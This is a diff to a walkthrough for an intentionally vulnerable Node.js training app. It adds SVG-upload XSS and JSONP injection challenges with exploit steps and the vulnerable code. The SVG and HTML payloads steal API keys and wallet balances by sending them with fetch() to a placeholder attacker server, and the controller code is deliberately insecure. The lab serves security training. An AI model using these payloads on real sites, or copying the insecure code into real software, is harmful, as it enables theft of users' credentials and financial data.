@@ -1,7 +1,7 @@
 <center>
 <h1> Vulnerable NodeJS Application</h1>
+<h3> github.com/payatu/vuln-nodejs-app </h3>
 </center>
-
 
 - [1. Command Injection](#1-command-injection)
   - [Exploit](#exploit)
@@ -79,6 +79,12 @@
 - [24. GraphQL IDOR](#24-graphql-idor)
   - [Exploit](#exploit-22)
   - [Vulnerable code](#vulnerable-code-19)
+- [25 XSS using SVG file upload](#25-xss-using-svg-file-upload)
+  - [Exploit](#exploit-23)
+  - [Vulnerable Code](#vulnerable-code-20)
+- [26 JSONP Injection](#26-jsonp-injection)
+  - [Exploit](#exploit-24)
+  - [Vulnerable Code](#vulnerable-code-21)
 
 <div class="page-break"></div>
 
@@ -1256,5 +1262,132 @@ async function graphql_ShowProfile(args){
     await con.connect()
     const userdata = await con.promise().query(q)
     return userdata[0][0]
+}
+```
+
+## 25 XSS using SVG file upload
+
+Application allow users to upload .svg file as a profile picture your goal is to steal other users information by using XSS. 
+
+### Exploit
+
+1. Login to attacker acccount
+2. Upload the following malicious .svg file in your account.
+   
+```
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      alert('This app is probably vulnerable to XSS attacks!');
+   </script>
+</svg>
+```
+3. Right click on your profile image click on view image and it will open the image in new tab and you will see an alert popup.
+4. Now modify the XSS payload in the svg file to steal details from other users acccount such as there API token that is returned from this endpoint `/jwt1/apiKey`
+   
+```xml
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script>
+function stealData(t) {
+    fetch(t).then(t => t.text()).then(t => {
+        fetch("http://<attackerserver>/steal?apitKey=" + t)
+    })
+}
+stealData("http://<vuln-nodejs-app>/jwt1/apiKey");
+   </script>
+</svg>
+```
+
+5. Save the above code in .svg file and upload it as your profile picture then copy the file url and send it your target and you will get apikey in your attacker server logs.
+
+### Vulnerable Code
+
+**Route: /routes/app.js**
+
+```js
+router.route('/svg-xss')
+    .get(authenticateToken, vuln_controller.svg_xss_get)
+    .post(authenticateToken, vuln_controller.svg_xss_fileupload_post);
+```
+
+**Controller: /controllers/vuln_controller.js**
+
+```js
+const svg_xss_fileupload_post = (req, res) => {
+    if (!req.files || Object.keys(req.files).length === 0) {
+        return res.status(400).send('No files were uploaded.');
+    }
+    const profilePic = req.files.profilePic;
+    const profilePicName = profilePic.name
+    const profilePicExtension = path.extname(profilePicName)
+    const allowedExtension = ['.png', '.jpg', '.jpeg', '.svg'] // .svg file allowed
+    if (!allowedExtension.includes(profilePicExtension)) {
+        return res.status(422).send('Only .PNG,.JPEG,.SVG files are allowed')
+    }
+    ... snip ...
+```
+
+## 26 JSONP Injection
+
+Application is using JSONP for fetching wallet balance information your goal is to steal wallet information of other users. 
+
+### Exploit
+
+1. First go to `/jsonp-injection` and analyze how browser is fetching latest wallet ballance using burpsuite.
+2. You will notice a callback parameter which contains callback function name and also the response type is application/javascript because it is JSONP endpoint
+3. Now send the request without callback parameter this time you will notice that server returned application/json content-type so if you are doing testing dont't forget to add '?callback' parameter in the request url to check if target api provides jsonp response.
+4. Since jsonp endpoint returns content-type application/javascript and allow us to specify callback funciton we can steal user information, by using jsonp endpoint as a script in our attacker website then sending it to victim to steal their information.
+5. Copy the following code in a HTML file and host it on your server.
+
+```html
+<html>
+<body>
+<script>
+function stealData(data){
+  console.log(data)
+  fetch("http://<attacker-server>/steal?data=" + JSON.stringify(data))
+}
+</script>
+<script src="http://<vuln-nodejs-app>:9000/jsonp-injection/wallet-usd-balance?callback=stealData">
+</script>
+
+</body>
+</html>
+```
+
+6. Host the exploit file on your attacker server then send it to victim once they open the page you will get there wallet balance on your webserver.
+   
+### Vulnerable Code
+
+**Route: /routes/app.js**
+
+```js
+router.get('/jsonp-injection/wallet-usd-balance', authenticateToken, vuln_controller.jsonp_wallet_get);
+```
+
+**Controller: /controllers/vuln_controller.js**
+```js
+const jsonp_wallet_get = (req, res)=>{
+    Wallet.findOne({where:{username: req.user.username}}, {attributes:['BTC', 'ETH']})
+    .then((crypto_balance)=>{
+        const bitcoin_quantity = crypto_balance.BTC;
+        const ethereum_quantity = crypto_balance.ETH;
+        const request = require('request')
+        request('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin%2Cethereum&vs_currencies=usd', {json: true}, (err, response, body)=>{
+            if (err) { return console.log(err); }
+            const bitcoin_usd_value = bitcoin_quantity * body.bitcoin.usd + Math.floor(Math.random() * 100);
+            const ethereum_usd_value = ethereum_quantity * body.ethereum.usd + Math.floor(Math.random() * 100);
+            const total_usd_value = bitcoin_usd_value + ethereum_usd_value + Math.floor(Math.random() * 100);
+            const data = {username: req.user.username, btc: bitcoin_usd_value, eth: ethereum_usd_value, total: total_usd_value}
+            res.jsonp(data) // send jsonp data
+        }) 
+    })
 }
 ```
